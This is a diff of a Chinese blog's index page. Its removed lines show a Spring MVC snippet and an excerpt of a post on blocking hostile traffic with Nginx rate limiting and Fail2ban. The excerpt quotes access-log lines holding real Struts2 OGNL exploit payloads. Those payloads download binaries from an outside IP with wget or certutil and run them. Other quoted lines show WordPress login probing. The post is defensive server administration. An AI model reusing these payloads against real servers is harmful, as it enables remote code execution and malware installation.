-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/test"</span>, method = RequestMethod.GET, RequestMethod.POST)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(@RequestParam(<span class="string">"param"</span>)</span> String testParam) </span>&#123;</span><br><span class="line">   	System.out.println(<span class="string">"Requst parm is "</span>+testParam);</span><br><span class="line">   	<span class="keyword">return</span> <span class="string">"Test"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="2-通过-PathVariable-获取请求参数"><a href="#2-通过-PathVariable-获取请求参数" class="headerlink" title="2. 通过 @PathVariable 获取请求参数"></a>2. 通过 <code>@PathVariable</code> 获取请求参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/test/&#123;parm&#125;"</span>, method = RequestMethod.GET, RequestMethod.POST)</span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(@PathVariable(<span class="string">"parm"</span>)</span> String testParm)</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">"Requst parm is "</span>+testParm);</span><br><span class="line">   	<span class="keyword">return</span> <span class="string">"Test"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/11/20/StrongFriends开发笔记/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Marticles">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0xCAFEBABE">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/" itemprop="url">Nginx流量控制配合Fail2ban抵御流量攻击</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-17T22:48:12+08:00">
-                2018-11-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/" class="leancloud_visitors" data-flag-title="Nginx流量控制配合Fail2ban抵御流量攻击">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,762 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近查看网站 Nginx 日志时，发现了很多恶意试探与攻击请求，最后是用 Nginx 自带的流量控制与 Fail2ban 动态黑名单解决了，效果不错，当有 IP 被 Ban 时还会有邮件通知，挺方便的。</p>
-<h2 id="Nginx-log-file"><a href="#Nginx-log-file" class="headerlink" title="Nginx log file"></a>Nginx log file</h2><p>分析 Nginx 日志内容，其中既有尝试攻击 Struts2 远程执行漏洞的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">178.128.122.170 - - [16/Nov/2018:23:50:08 +0800] http &quot;GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20&amp;&amp;%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)&amp;&amp;(pkill%20loop%20&amp;&amp;%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&amp;&amp;%20chmod%20777%20.loop%20&amp;&amp;%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.002</span><br><span class="line">178.128.122.170 - - [16/Nov/2018:23:50:08 +0800] http &quot;GET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&amp;cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.003</span><br></pre></td></tr></table></figure>
-<p>也有尝试登录 WP 管理页面的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /wp-login.php HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.163</span><br><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /administrator/ HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.204</span><br><span class="line">93.115.97.183 - - [17/Nov/2018:06:04:45 +0800] http &quot;GET /admin.php HTTP/1.1&quot; 404 209 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.203</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET / HTTP/1.1&quot; 200 30075 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.005</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET /wp-includes/wlwmanifest.xml HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.154</span><br><span class="line">123.31.30.209 - - [17/Nov/2018:06:08:27 +0800] http &quot;GET /xmlrpc.php?rsd HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;KeepAliveClient&quot; &quot;-&quot; - 0.053</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/11/17/Nginx流量控制配合Fail2ban抵御流量攻击/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2292,7 +2298,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2303,7 +2309,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2314,7 +2320,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2375,7 +2381,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">94.6k</span>
+    <span title="Site words total count">96.9k</span>
   
 </div>
 
@@ -2397,6 +2403,12 @@
 <div class="busuanzi-count">
   <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
   
 
   
